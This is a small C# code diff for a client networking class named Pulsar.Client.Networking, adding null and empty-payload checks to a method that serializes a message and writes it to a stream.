@@ -361,7 +361,7 @@ namespace Pulsar.Client.Networking
         /// <param name="message">The message to send.</param>
         private void SafeSendMessage(IMessage message)
         {
-            if (_stream == null)
+            if (_stream == null || message == null)
             {
                 return;
             }
@@ -374,6 +374,11 @@ namespace Pulsar.Client.Networking
                         return;
 
                     var payload = PulsarMessagePackSerializer.Serialize(message);
+                    if (payload == null || payload.Length == 0)
+                    {
+                        return;
+                    }
+                    
                     _stream.Write(BitConverter.GetBytes(payload.Length), 0, HEADER_SIZE);
                     _stream.Write(payload, 0, payload.Length);
                     _stream.Flush();
